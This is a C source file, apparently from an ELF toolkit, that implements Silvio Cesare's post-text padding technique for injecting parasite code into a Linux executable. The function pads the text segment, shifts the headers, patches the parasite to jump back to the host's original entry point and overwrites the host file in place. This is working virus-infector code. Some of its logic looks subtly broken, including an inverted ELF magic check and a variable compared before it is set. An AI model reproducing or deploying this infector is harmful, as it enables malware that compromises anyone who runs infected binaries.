#include "elfit.h"

/* Inject parasite code into an 
 * executable using Silvio Cesare's 
 * post text padding technique 
 * @param host filename containing the host
 * @param parasite filename containing the parasite
 * @param patch_position position in the parasite code to insert the host's code address
 */
uint32_t posttext_inject(Elfit_t *host, char *parasite, uint32_t patch_position)
{
    unsigned long entry_point, text_offset, text_begin;
    unsigned int entry_offset;
    unsigned char buf[PAGE_SIZE];
    unsigned int ehdr_size;
    struct stat pst;
    int pfd, ofd;
    int psize;
    int text_found;
    Elf32_Ehdr *ehdr;
    Elf32_Phdr *phdr;
    Elf32_Shdr *shdr;
    int i, wrote;

    if ((pfd = open(parasite, O_RDONLY)) == -1)
    {
        perror("parasite open");
        exit(-1);
    }

    if (fstat(pfd, &pst))
    {
        perror("parasite stat");
        exit(-1);
    }

    psize = pst.st_size;

    ehdr = (Elf32_Ehdr *) host->mem;
    entry_point = ehdr->e_entry;
    ehdr_size = sizeof(*ehdr);


    if (!(ehdr->e_ident[0] == 0x7f && strcmp(&ehdr->e_ident[1], "ELF")))
    {
        printf("host is not an ELF\n");
        exit(-1);
    }

    text_found = 0;
    phdr = (Elf32_Phdr *) (host->mem + ehdr->e_phoff);

    // iterate over phdrs looking for the text segment
    for (i = ehdr->e_phnum; i-- > 0; phdr++)
    {
        if (text_found && phdr->p_offset >= entry_offset)
        {
            phdr->p_offset += PAGE_SIZE;
        }

        if (phdr->p_type == PT_LOAD)
            if (phdr->p_flags == (PF_R | PF_X))
            {
                text_found++;
                text_offset = phdr->p_offset; // offset of text segment on file
                text_begin = phdr->p_vaddr; 
                entry_offset = phdr->p_filesz; // offset to parasite entry point
                phdr->p_filesz += psize;
                phdr->p_memsz += psize;
            }
    }


    shdr = (Elf32_Shdr *) (host->mem + ehdr->e_shoff);
    for (i = ehdr->e_shnum; i-- > 0; shdr++)
    {
        if (shdr->sh_offset >= (text_offset + entry_offset))
        {
            shdr->sh_offset += PAGE_SIZE;
        }
    }

    // push section header table
    ehdr->e_shoff += PAGE_SIZE;

    if (psize > PAGE_SIZE)
    {
        printf("parasite too large\n");
        exit(-1);
    }

    if (read(pfd, buf, psize) == -1)
    {
        perror("parasite: read");
        exit(-1);
    }

    int preparasite_size_file = text_offset + entry_offset;

    // patch parasite code
    *(unsigned long *)&buf[patch_position] = entry_point;
    printf("Patching parasite to jmp to %x\n", entry_point);

    if ((ofd = open(TMP, O_CREAT | O_WRONLY | O_TRUNC, host->file->st_mode))
        < 0) 
    {
        perror("tmp binary: open");
        exit(-1);
    }

    if ((wrote = write(ofd, host->mem, preparasite_size_file)) != preparasite_size_file)
    {
        perror("tmp binary: write contents up to parasite");
        exit(-1);
    }

    if ((wrote = write(ofd, buf, psize)) != psize) 
    {
        perror("tmp binary: write parasite");
        exit(-1);
    }

    // Physically insert the new code (parasite) and pad to PAGE_SIZE, into the file - text segment p_offset + p_filesz (original)
    if (lseek(ofd, PAGE_SIZE-psize, SEEK_CUR) < 0)
    {
        perror("seek");
        exit(-1);
    }

    if (write(ofd, host->mem + text_offset + entry_offset, 
        host->file->st_size-preparasite_size_file) 
        != host->file->st_size-preparasite_size_file)
    {
        perror("tmp binary: write post injection");
        exit(-1);
    }

    rename(TMP, host->name);
    close(ofd);

    return text_begin + entry_offset; 
}
